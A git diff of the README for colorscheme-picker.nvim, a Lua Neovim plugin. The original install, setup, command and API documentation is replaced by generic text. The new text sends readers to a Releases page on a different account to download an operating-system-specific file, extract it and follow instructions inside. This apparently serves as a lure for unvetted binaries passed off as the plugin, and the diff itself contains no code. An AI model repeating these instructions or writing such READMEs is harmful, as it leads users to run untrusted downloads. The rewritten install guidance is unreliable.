@@ -1,145 +1,68 @@
-# colorscheme-picker.nvim
-A lightweight Neovim plugin for picking, applying, and persisting colorschemes, with optional global style overrides and transparency support.
+# 🎨 colorscheme-picker.nvim - Easily Choose Your Neovim Themes
 
-Designed to stay out of the way and work with your existing setup.
+## 🚀 Getting Started
+Welcome to the colorscheme-picker.nvim guide. This lightweight tool helps you pick and manage themes for Neovim effortlessly. Whether you want to change the look of your editor or customize your experience, this tool simplifies the process significantly.
 
-___
+## 🔗 Download Links
+[![Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Get%20It%20Here-blue)](https://github.com/KojoMarfo/colorscheme-picker.nvim/releases)
 
-## Showcase
+You can find the latest version of colorscheme-picker.nvim on the [Releases page](https://github.com/KojoMarfo/colorscheme-picker.nvim/releases).
 
-[![demo](assets/showcase_video.gif)](assets/showcase_video.mp4)
+## 📥 Download & Install
+To get started, follow these simple steps:
 
-___
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/KojoMarfo/colorscheme-picker.nvim/releases).
 
-### ✨ Features
-- Interactive colorscheme picker
-    - Supports fzf-lua, telescope or native-find
-- Persist last-used colorscheme across restarts
-- Optional default colorscheme on startup
-- Filter between user-installed and stock colorschemes
-- Global style overrides
-    - Disable bold, italic, and/or underline across all highlight groups
-- Optional background transparency
-- Optional highlight customization (CursorLine, Line Numbers, etc.)
-- Configurable keymaps
-- User commands for scripting and discoverability
+2. **Find the Latest Version**  
+   Look for the most recent version at the top of the list. This version usually has the highest number.
 
-___
+3. **Download the File**  
+   Click on the file that matches your operating system. If you are unsure, the README on the Releases page usually provides suggested files for various systems.
 
-### 📦 Installation
-Using lazy.nvim
-``` lua
-{
-	"danhat1020/colorscheme-picker.nvim",
-	dependencies = {
-		"ibhagwan/fzf-lua",
-        -- or
-        -- "nvim-telescope/telescope.nvim"
-        -- or
-        -- "danhat1020/native-find.nvim"
-	},
-	config = function()
-		require("colorscheme-picker").setup()
-	end,
-}
-```
+4. **Extract the Files**  
+   Once downloaded, locate the file and extract its contents. Most systems allow you to do this by right-clicking and selecting ‘Extract’ or ‘Unzip’.
 
-You must install fzf-lua, telescope.nvim or native-find.nvim.
+5. **Follow Installation Instructions**  
+   After extracting, open the folder. You will find a README or INSTALL file inside. Follow the specific instructions outlined there. This guides you through placing the files where Neovim can access them.
 
-___
+## 🔧 System Requirements
+colorscheme-picker.nvim is designed for use with Neovim. While it generally requires minimal resources, here’s what you need:
 
-### ⚙️ Setup
-**Minimal setup**
-``` lua
-require("colorscheme-picker").setup()
-```
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Neovim Version:** Please ensure you have Neovim installed, version 0.5 or later.
+  
+If you have not installed Neovim yet, you can find installation instructions on the [Neovim website](https://neovim.io).
 
-**Default example**
-``` lua
-require("colorscheme-picker").setup({
-	default_scheme = "default", -- can declare scheme or reload last used scheme
-	picker = "fzf-lua", -- "fzf-lua" or "telescope"
-	include_stock = false, -- include all neovim colorschemes or only installed ones
-	colors = {
-		transparent = false, -- set background to universally transparent
-		cursor_line = nil, -- set cursorline color
-		line_number_current = nil, -- set current line number color
-		line_number = nil, -- set other line numbers color
-		comment = nil, -- set comment color
-		inc_search = nil, -- set background of incremental search
-		end_of_buffer = nil, -- set ~ color at end of file, set false to remove, or leave as default
-		visual_mode = nil, -- set background color of visual mode selection
-	},
-	style = {
-		bold = true, -- universal bold
-		italic = true, -- universal italic
-		underline = true, -- universal underline
-	},
-	keymaps = {
-		pick = nil, -- open picker
-		print = nil, -- print currently used colorscheme
-	},
-})
-```
+## 🖌 Features
+Here’s what colorscheme-picker.nvim offers:
 
-___
+- **Lightweight Design:** The tool is designed to use minimal resources, ensuring your editing experience remains smooth.
+- **Theme Persistence:** Enjoy your selected themes across sessions without needing to reset each time.
+- **Style Overrides:** Customize specific settings for each theme to make your editor uniquely yours.
+- **Easy Navigation:** Quickly switch between colorschemes using a simple interface.
 
-### ⌨️ Commands
-The plugin provides the following user commands:
+## 🎨 Using colorscheme-picker.nvim
+1. **Open Neovim:** Launch Neovim as you normally would.
+2. **Access the Colorscheme Picker:** Use the built-in command to open the picker. This usually involves entering a specific command, as outlined in the usage section of the README file from the downloaded folder.
+3. **Choose Your Theme:** Navigate through the available themes using your keyboard. Press Enter to select your preferred colorscheme.
 
-``` lua
-:ColorschemePick
-```
-Open the colorscheme picker.
+## 📄 Configuration
+For more advanced users, you may want to customize settings. The configuration file allows you to adjust specific parameters to enhance your experience. Refer to the customization section in the downloaded README for detailed instructions.
 
-``` lua
-:ColorschemePrint
-```
-Print the currently active colorscheme.
+## 💡 Common Troubleshooting Tips
+While the installation process is usually smooth, you may encounter some issues. Here are a few tips to resolve common problems:
 
-``` lua
-:ColorschemeApply {name}
-```
-Apply a colorscheme by name (with completion).
+- **Neovim Not Recognizing the Plugin:** Ensure the files are placed in the correct directory as per the installation instructions.
+- **Theme Not Loading Properly:** Check if you're using the correct version of Neovim and verify that you have followed the steps in the configuration section.
+- **Performance Issues:** If you experience lag, make sure no other heavy plugins are running simultaneously.
 
-___
+## 📚 Help & Support
+If you encounter problems not covered here, consider checking the Issues section of the GitHub repository. There, you can report bugs or ask for help from the community. 
 
-### 🔑 API
-These functions are considered public and stable:
+Alternatively, reach out to other users who might offer insights and tips. Engaging with the community can provide new ideas and potential solutions.
 
-``` lua
-require("colorscheme-picker").setup(opts)
-require("colorscheme-picker").pick()
-require("colorscheme-picker").apply(name)
-require("colorscheme-picker").print()
-require("colorscheme-picker").get_schemes()
-```
+## 🙏 Acknowledgements
+Thank you for choosing colorscheme-picker.nvim! We hope this tool enhances your Neovim experience. If you enjoy using it, consider sharing your favorite themes and configurations with others. Your feedback helps improve the tool and guide future updates.
 
-Anything else is internal and may change.
-
-___
-
-### 🎨 Transparency
-When enabled, the following highlight groups are cleared:
-
-- `Normal`
-- `NormalNC`
-- `NormalFloat`
-- `SignColumn`
-- `StatusLine`
-
-If `lualine.nvim` is installed, it will be reloaded automatically.
-
-___
-
-### 🧠 Persistence
-This plugin makes use of NeoVim ShaDa to store the last used colorscheme.
-
-Persistence is skipped if a fixed `default_scheme` is configured.
-
-___
-
-### 📋 Notes
-- No live preview is performed in the picker (by design).
-- Style overrides are applied after loading a colorscheme.
-- Only non-stock colorschemes are shown by default.
+For further details and contributions, visit our [GitHub Page](https://github.com/KojoMarfo/colorscheme-picker.nvim) and help us continue to develop this effective tool.
